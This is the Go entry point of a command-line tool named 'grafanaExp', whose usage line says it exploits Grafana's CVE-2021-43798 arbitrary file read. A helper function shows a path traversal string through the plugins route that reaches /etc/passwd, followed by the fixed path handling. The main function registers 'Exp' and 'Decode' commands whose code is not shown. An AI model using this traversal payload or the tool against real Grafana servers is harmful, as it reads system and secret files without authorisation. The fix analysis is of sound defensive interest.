package main

import (
	"github.com/urfave/cli/v2"
	"grafanaExp/internal"
	"log"
	"os"
	"path/filepath"
)

func analysis() {
	requestedFile := filepath.Clean("public/plugins/xxxx/../../../../../../../../../../../../../etc/passwd")
	println("requestedFile ==> " + requestedFile)
	// requestedFile ==> ../../../../../../../../../../etc/passwd
	pluginFilePath := filepath.Join("/var/grafana/plugins/", requestedFile)
	println("pluginFilePath ==> " + pluginFilePath)
	// pluginFilePath ==> /etc/passwd

	// prepend slash for cleaning relative paths
	requestedFile = filepath.Clean(filepath.Join("/", "public/plugins/xxxx/../../../../../../../../../../../etc/passwd"))
	rel, _ := filepath.Rel("/", requestedFile)
	absPluginDir, _ := filepath.Abs("/var/grafana/plugins/")
	pluginFilePath = filepath.Join(absPluginDir, rel)
	println("Fixed pluginFilePath ==> " + pluginFilePath)
	// Fixed pluginFilePath ==> /var/grafana/plugins/etc/passwd
	return
}

func main() {
	app := cli.NewApp()
	app.Name = "grafanaExp"
	app.Authors = []*cli.Author{
		&cli.Author{
			Name: "A&D-Team",
		}}
	app.Usage = "Exploit Grafana with CVE-2021-43798 Arbitrary File Read."
	app.Commands = []*cli.Command{&internal.Exp, &internal.Decode}
	err := app.Run(os.Args)
	if err != nil {
		log.Fatal(err)
	}
}
